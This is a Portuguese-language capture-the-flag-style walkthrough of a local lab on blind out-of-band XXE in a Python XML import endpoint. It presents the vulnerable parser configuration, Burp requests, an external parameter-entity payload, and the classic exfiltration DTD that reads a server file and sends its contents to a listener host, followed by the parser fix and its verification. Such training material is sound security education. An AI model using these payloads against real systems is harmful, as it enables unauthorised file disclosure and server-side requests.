# Walkthrough — xxe-blind-oob

A app parseia um documento XML que você envia e responde o mesmo `{"status": "received"}` genérico toda vez — nunca ecoa nada de volta. Essa resposta muda esconde um bug: o parser resolve **entidades externas**. Um documento cujo preâmbulo aponta uma entidade pra um servidor que você controla faz o parser alcançá-lo, e a chegada dessa requisição — não a resposta — é a prova. Você vai confirmar a vulnerabilidade out-of-band e depois usar a mesma resolução de entidade pra exfiltrar um arquivo do servidor.

## 1. Contexto

Um pouco de vocabulário primeiro, porque o exploit é montado com ele:

- Documentos **XML** podem carregar uma **DTD** (Document Type Definition): um preâmbulo opcional, introduzido por `<!DOCTYPE …>`, que pode declarar **entidades** — atalhos nomeados que o parser expande, como variáveis.
- Uma entidade pode ser **externa**, declarada com a palavra-chave `SYSTEM` e uma URI. A URI pode ser um arquivo local (`file:///etc/passwd`) ou uma URL de rede (`http://atacante/…`). Se o parser resolve entidades externas, ele **busca** o que a URI aponta.
- Uma **parameter entity** (escrita com `%`, ex.: `<!ENTITY % ext …>`) é uma entidade usada *dentro da própria DTD*, não no corpo do documento. Ela é processada enquanto a DTD é parseada — o que a torna útil quando o corpo não ecoa nada.
- **In-band** quer dizer que o resultado volta na resposta HTTP (como no `xxe-basic`, onde você lê o `/etc/passwd` na página). **Out-of-band (OOB)** quer dizer que a resposta não diz nada e você observa o efeito por um canal lateral — aqui, uma requisição que o parser faz pra um **listener** que você controla.

A feature: `POST /import` recebe um documento XML no corpo da request e devolve `{"status": "received"}` — um endpoint de "importação em lote" que confirma o recebimento e não te mostra mais nada. Isto é **XML External Entity (XXE) injection**, sob **A05 — Security Misconfiguration**: a causa-raiz é uma configuração perigosa do parser (resolução de entidade externa ligada), não um bug de lógica.

**O lab são três containers** (ver [`docker-compose.yml`](./docker-compose.yml)):

- `vulnerable` (`127.0.0.1:8030`) e `fixed` (`127.0.0.1:8130`) — o importador, quebrado e corrigido.
- `oob-listener` — um **sink out-of-band** burro. Serve a DTD do atacante e loga toda request que recebe. É um **tripwire, não um alvo**: não guarda segredo. **Não** é publicado no host, então `curl http://oob-listener/` do seu laptop não o alcança; ele só é alcançável de dentro das redes Docker, no hostname `oob-listener` na porta 80. Você o observa por `docker compose logs oob-listener`.

**Por que embarcar um listener?** Num engagement real você usaria um servidor de interação externo — Burp Collaborator, `interactsh`, um catcher que você controla na internet. Este lab é bindado em `127.0.0.1` e não pode depender de alcançar um terceiro, então embarca um substituto self-hosted e air-gapped. Tudo que você faz contra ele, você faria contra o Collaborator no campo — e todo callback aqui fica na sua máquina.

A trilha principal é o Burp Repeater (pra disparar a request) mais `docker compose logs` (pra capturar o callback). Há um ator: você, o pentester, sondando o endpoint.

## 2. Ache o bug

Abra o [`vulnerable/app.py`](./vulnerable/app.py). A view do `/import` é curta:

```python
xml = request.data  # raw XML body (Content-Type: application/xml)
# VULNERABLE: parse untrusted XML with a parser that RESOLVES EXTERNAL ENTITIES, loads DTDs,
# and is allowed to reach the NETWORK (no_network=False). ...
parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)  # dangerous
try:
    etree.fromstring(xml, parser)  # parsing resolves the external entity -> OOB fetch
except etree.XMLSyntaxError:
    pass  # swallow: surfacing the parse error would leak an in-band oracle
return jsonify(status="received")  # generic: says nothing about what the parser resolved
```

O corpo cru da request flui direto pro `etree.fromstring(..., parser)`. O parser é montado pra resolver entidades externas (`resolve_entities=True`), processar a DTD (`load_dtd=True`) e alcançar a rede (`no_network=False`). Duas perguntas de auditoria:

- *O parser resolve uma entidade que EU declaro no documento, inclusive uma que aponta pra um servidor?* — **sim**. Isso é o XXE.
- *Consigo ler o resultado na resposta?* — **não**. A rota devolve uma string fixa e engole erros de parse. É isso que a torna **blind**.

As duas respostas importam, e são independentes. A primeira é a vulnerabilidade; a segunda é só o quão difícil é confirmar. O fix vai ser desligar as features de entidade externa e DTD do parser — antecipado aqui, aplicado no [`DIFF.md`](./DIFF.md).

## 3. Exploração via Burp Suite + logs (trilha principal)

O endpoint recebe um corpo XML cru, então não há form-encoding pra brigar (diferente do `xxe-basic`, cujo payload viajava num campo de form URL-encoded): você cola o XML direto no corpo do Repeater com `Content-Type: application/xml`.

### Passo 1 — Baseline: conheça o canal mudo

Envie primeiro um documento benigno, pra saber com o que "nada aconteceu" se parece. No Repeater:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8030
Content-Type: application/xml
Content-Length: 64

<?xml version="1.0"?>
<import><item>Ada Lovelace</item></import>
```

Resposta:

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"status":"received"}
```

Agora confira o listener:

```bash
docker compose logs oob-listener
```

Nada de novo — o documento benigno não declarou entidade externa nenhuma, então o parser não alcançou nada. **Fique com a resposta: `{"status":"received"}` é tudo que você vai receber, quer o import tenha "funcionado", falhado, ou feito algo que você não pretendia. A resposta não distingue esses casos. Isto é blind XXE, e é por isso que o resto deste walkthrough vive nos logs, não na resposta.**

### Passo 2 — Disparar o payload

Agora declare uma **parameter entity** externa que aponta pro listener, e a referencie pra o parser buscá-la. O path `.dtd` é um marcador fixo e reconhecível que você escolheu:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8030
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE import [
  <!ENTITY % ext SYSTEM "http://oob-listener/proof-xxe-30.dtd">
  %ext;
]>
<import><item>test</item></import>
```

Resposta:

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"status":"received"}
```

A resposta é, de novo, `{"status":"received"}` — **byte a byte igual ao baseline.** O Burp não te mostra **nada** sobre o parser ter alcançado o listener. Se você parasse aqui, não poderia afirmar que o XXE disparou. Então não pare aqui.

### Passo 3 — Confirmar out-of-band (a prova)

Leia o log do listener:

```bash
docker compose logs oob-listener
```

```
oob-listener-1  | INFO:app:OOB HIT path=/proof-xxe-30.dtd from=172.18.0.3
oob-listener-1  | INFO:app:OOB HIT path=/proof-xxe-30/exfil?x=FLAG-xxe30-9f1c2a-EXAMPLE-not-a-real-secret from=172.18.0.3
```

Dois callbacks chegaram — e o corpo da resposta não poderia ter te contado sobre nenhum dos dois.

**A primeira linha é a confirmação.** O parser buscou `http://oob-listener/proof-xxe-30.dtd` — um host que seu laptop nem alcança — porque seu documento o fez resolver a parameter entity externa `%ext;`. `from=172.18.0.3` é o endereço do container `vulnerable`. Esse único hit, vindo de um endpoint mudo, é blind XXE provado out-of-band: o parser alcançou um destino que você escolheu.

**A segunda linha é o impacto.** A DTD que o listener devolveu não é inerte — é o payload clássico de exfiltração de blind XXE:

```dtd
<!ENTITY % file SYSTEM "file:///app/secret.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://oob-listener/proof-xxe-30/exfil?x=%file;'>">
%eval;
%exfil;
```

Lendo de cima pra baixo: `%file` lê um arquivo local do servidor da **app** (`/app/secret.txt`); `%eval` monta uma segunda entidade, `%exfil`, cuja URL embute o conteúdo desse arquivo; referenciar `%exfil;` dispara uma requisição pro listener com o arquivo na query string. O resultado é a segunda linha do log: `x=FLAG-xxe30-9f1c2a-EXAMPLE-not-a-real-secret` — o arquivo da própria app, entregue a você out-of-band. (O valor é um placeholder de lab obviamente falso, não um segredo real.)

Essa é a habilidade central de blind XXE: provar que o parser alcançou algo quando você não vê o resultado, e depois cavalgar o mesmo canal pra puxar um arquivo pra fora.

**Uma nota sobre o que exfiltra limpo.** Esse truque de URL carrega o arquivo só se o conteúdo for URL-safe numa linha: uma quebra de linha, ou um `&`, `%` ou `>` no arquivo, quebra a URI construída e a segunda requisição nunca dispara (uma limitação real do `libxml2`). O secret do lab é um marcador single-line controlado pra a exfiltração ser determinística; contra um arquivo multi-linha arbitrário você frequentemente teria o primeiro callback (a confirmação) mas precisaria de técnicas error-based ou mais elaboradas pra puxar o conteúdo. A **confirmação** out-of-band — o primeiro hit — não depende de nada disso.

**Uma nota sobre DNS.** Este lab usa um callback HTTP porque é simples e auto-contido. No campo, o sinal out-of-band costuma ser um pingback de **DNS**: filtro de egress pode barrar uma conexão HTTP de saída, mas o servidor quase sempre ainda consegue resolver um nome, e essa resolução alcança seu servidor de interação. Mesma ideia — uma requisição escapando pra um sink que você controla — por um canal com mais chance de sobreviver a filtro. Burp Collaborator e `interactsh` capturam os dois.

## 4. O que a vuln NÃO é

Como o exploit não produz loot visível na resposta, é fácil tirar a lição errada. Fixe o que isto **não** é:

- **Não é "sem eco, nada vaza".** A resposta não revelou nada, e mesmo assim o XXE é real e um arquivo saiu pelo canal OOB — o log prova. Cegueira não é ausência. É a concepção errada que o átomo existe pra matar.
- **Não é "esconder o eco" como fix.** O fix tentador depois de ver o `xxe-basic` é "parar de devolver o valor". Mas esta app *já* não devolve nada, e é totalmente vulnerável. O valor voltar nunca foi o bug; o **parser resolver a entidade** é. Esconder o output só remove sua confirmação in-band.
- **Não é XXE in-band (`xxe-basic`).** Mesma causa (um parser que resolve entidades externas), mesmo fix (desligar). O que difere é o canal: lá você lê o arquivo na resposta; aqui você detecta o callback out-of-band. Não é um bug novo — o mesmo XXE com o canal direto removido.
- **Não é RCE.** Você fez o parser buscar URLs escolhidas pelo atacante e revelar um arquivo out-of-band. Isso é sério, mas não é execução de código no servidor da app.
- **Não é "a SSRF da própria app".** A requisição de saída é feita pelo **parser XML** resolvendo sua entidade, não por código da app chamando um cliente HTTP. Parece uma requisição server-side (e blind XXE pode de fato alcançar serviços internos — "SSRF via XXE"), mas a classe é XXE e o fix é o fix de XXE, e é por isso que este átomo mora em A05, não A10.

**Prova de isolamento:** o documento benigno do Passo 1 não gera **nenhum** hit, nem na app vulnerable nem na fixed; só o payload, contra a app vulnerable, faz o listener logar um callback — e contra a fixed, nem isso. A diferença é inteiramente o parser, não a lógica da app e não a resposta.

## 5. Impacto

**Blind XXE confirmado out-of-band, escalando pra exfiltração de arquivo.** O piso é a confirmação: o parser resolve uma entidade externa que você declarou e emite uma requisição de saída pra um destino que você escolhe — prova de que a vulnerabilidade é real apesar de uma resposta muda, e a mesma primitiva que pode alcançar serviços internos (SSRF via XXE). O teto demonstrado aqui é a revelação out-of-band de um arquivo do servidor da app (`/app/secret.txt`), cujo conteúdo single-line e URL-safe sai numa URL de callback. **Não** é RCE, e arquivos multi-linha arbitrários esbarram na limitação de URI notada acima — então sem overclaim de que "qualquer arquivo vaza inteiro". XXE tem outras faces (revelação error-based, leitura in-band, negação de serviço); este átomo é a face out-of-band. O listener é um tripwire, não um prêmio.

## 6. Por que o fix funciona

Veja o [`DIFF.md`](./DIFF.md) pra a mudança. A view `/import` corrigida monta o parser com as features perigosas **desligadas**:

```python
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=False)  # hardened
```

Repita o Passo 2 contra <http://127.0.0.1:8130/import>:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8130
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE import [
  <!ENTITY % ext SYSTEM "http://oob-listener/proof-xxe-30.dtd">
  %ext;
]>
<import><item>test</item></import>
```

Resposta: `200 OK`, corpo `{"status":"received"}` — **byte-idêntica à resposta da app vulnerable.** Agora leia o log:

```bash
docker compose logs oob-listener
```

**Não** há hit novo do container fixed. Com `resolve_entities=False` e `load_dtd=False`, a parameter entity externa nunca é resolvida, então a DTD nunca é buscada — sem primeiro callback, e portanto sem exfiltração também. A resposta é a mesma nas duas apps; a única diferença observável é o callback que não acontece. Em blind XXE, é exatamente assim que você confirma o fix — do mesmo jeito que confirmou o bug: out-of-band.

Duas coisas que o `DIFF.md` deixa precisas, porque são o ponto do fix:

- **O fix é no parser, não na resposta e não na rede.** A resposta já era muda e ainda explorável, então escondê-la não é fix. E deixar a rede alcançável tudo bem: com resolução de entidade e DTD desligadas, o parser não resolve referência externa nenhuma. O `fixed` ainda consegue alcançar o `oob-listener` na rede; ele só nunca tenta.
- **As duas flags são load-bearing.** Desligar só uma deixa um caminho que ainda busca a DTD (o probe no [`DIFF.md`](./DIFF.md) mostra isso). O fix de XXE é desligar resolução de entidade externa **e** carga de DTD juntas.
